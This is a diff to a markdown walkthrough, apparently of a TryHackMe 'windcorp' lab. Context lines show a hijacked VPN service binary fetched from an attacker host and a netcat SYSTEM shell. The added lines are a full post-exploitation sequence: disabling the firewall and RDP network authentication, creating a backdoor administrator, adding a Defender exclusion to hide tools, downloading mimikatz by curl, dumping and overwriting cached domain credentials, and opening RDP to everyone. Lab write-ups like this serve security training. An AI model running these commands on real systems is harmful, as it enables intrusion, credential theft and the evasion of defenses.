@@ -1714,12 +1714,12 @@ I also specified that the service must run as local system user. Once compiled w
 	PS C:\script> Invoke-WebRequest http://10.9.0.223:8000/IVPN.exe -outfile c:\temp\IVPN.exe
 Then trigger the update script to transfer the exe to the IVPN client folder:
 
-	PS C:\script> cscript update.vbs
+	PS C:\script> cscript C:\script\update.vbs
 	cscript update.vbs
 	Microsoft (R) Windows Script Host Version 5.812
 	Copyright (C) Microsoft Corporation. All rights reserved.
 	
-    	dir "C:\Program Files\IVPN Client"
+    	dir "C:\Program Files\IVPN Client" | findstr IVPN.exe
 
     	Directory: C:\Program Files\IVPN Client
 
@@ -1731,7 +1731,7 @@ Then trigger the update script to transfer the exe to the IVPN client folder:
 
 Now we need to restart the service, and once we get the message, hit CTRL+C to kill the session
 
- 	 PS C:\script> net stop "IVPN Client"; net start "IVPN Client"
+ 	PS C:\script> net stop "IVPN Client"; net start "IVPN Client"
     	The IVPN Client service is stopping.
     	The IVPN Client service was stopped successfully.
 	
@@ -1739,7 +1739,7 @@ Now we need to restart the service, and once we get the message, hit CTRL+C to k
                                                                                                                                                      
 Then within 10 seconds restart the listener and you should get a shell as system:
 
-	└─$ nc -lvp 1234
+	nc -lvp 1234
 	listening on [any] 1234 ...
 	10.10.53.226: inverse host lookup failed: Unknown host
 	connect to [10.9.0.223] from (UNKNOWN) [10.10.53.226] 50177
@@ -1751,4 +1751,98 @@ Then within 10 seconds restart the listener and you should get a shell as system
 	PS C:\Windows\system32> whoami
 	whoami
 	nt authority\system
+
+Enable RDP:
+
+	Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
+
+Disable windows FW to permit login from our VPN:
+
+	Set-NetFirewallProfile -Profile Public -Enabled False
+
+Create a local user as admininistrator:
+
+	net user support.it Pwd1234 /add
+ 	net localgroup administrators support.it /add
 	
+Then login to RDP with the newly created user. In case you got a message warning that another user is logged in, proceed to ask for the disconnection, alternative you can force and kill a user session as follows:
+
+	PS C:\users\chajoh\desktop> query user
+	query user
+	 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+	 alcrez                                    1  Disc            2  7/9/2024 5:22 AM
+
+	PS C:\users\chajoh\desktop> logoff 1
+Once logged in as local administrator I managed to define a defender esclusion folder in:
+
+	C:\Users\Public\support_tools
+ Eventually you can hide the folder to cover a bit our traces. Then I downloaded into Osiris mimikatz:
+
+ 	C:\Users\Public\support_tools>curl -O http://10.9.0.223:8000/mimikatz.exe
+
+Execute mimikatz and set the appropriate permissions:
+
+	mimikatz # privilege::debug
+ 	mimikatz # token::elevate
+Looking for cached credentials:
+
+  	mimikatz # lsadump::cache
+
+	Domain : OSIRIS
+	SysKey : fb2f42c056c3a91c3f8892df313f2481
+	Local name : OSIRIS ( S-1-5-21-2412384816-2079449310-1594074140 )
+	Domain name : WINDCORP ( S-1-5-21-555431066-3599073733-176599750 )
+	Domain FQDN : windcorp.thm
+	Policy subsystem is : 1.18
+	
+	LSA Key(s) : 1, default {04097fcd-7247-4e79-b35b-2a7d5fee2779}
+	  [00] {04097fcd-7247-4e79-b35b-2a7d5fee2779} 0d155c51e747c1119d69e11e96f37364aaaa190673e7ccb1321a931636b166c2
+	
+	* Iteration is set to default (10240)
+	* 
+	[NL$1 - 9/19/2020 1:38:15 AM]
+	RID       : 00000465 (1125)
+	User      : WINDCORP\chajoh
+	MsCacheV2 : f52542bb7f50df1b7bb0fd0ef1778781
+	...
+
+Reset chajoh domain password (Note: don't specify the domain in the user value, since the machine is not registered to a domain)
+
+	mimikatz # lsadump::cache /user:chajoh /password:Password1234$ /kiwi
+ 	> User cache replace mode !
+	  * user     : chajoh
+	  * password : Password1234$
+	  * ntlm     : a327efd8971f1856271d1f8199e98a60
+
+	...
+	[NL$1 - 9/19/2020 1:38:15 AM]
+	RID       : 00000465 (1125)
+	User      : WINDCORP\chajoh
+	MsCacheV2 : d576dff437c340753deb41739f4528b5
+	> User cache replace mode (2)!
+	  MsCacheV2 : a69d765df4fe97286b0f85bb3752f8a6
+	  Checksum  : 3c2d348c98bb867c213bdc5ff63387c1
+	> OK!
+ 	...
+ Add chajoh user to local administrator to permit RDP login:
+
+	net localgroup administrators WINDCORP\chajoh /add
+ But I got an error:
+ 	
+  	...
+	The trust relationship between this workstation and the primary domain failed.
+This means that the server is not joing a domain. At this point I allowed everyone to RDP:
+
+	net localgroup "remote desktop users" everyone /add
+	The command completed successfully.
+
+In order to access RDP session without being authenticated before, we have to disable NLA. More information [here](https://www.portnox.com/cybersecurity-101/network-level-authentication-nla/#:~:text=level%20authentication%20remotely%3F-,What%20is%20network%20level%20authentication%20(NLA)%3F,remote%20desktop%20session%20is%20established.). We can use the following command (you can also proceed as illustrated in the previous article using the GUI):
+
+	C:\Windows\system32>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\WinStations\RDP-TCP" /v UserAuthentication /t REG_DWORD /d "0" /f
+	The operation completed successfully.
+
+
+
+
+
+ 	
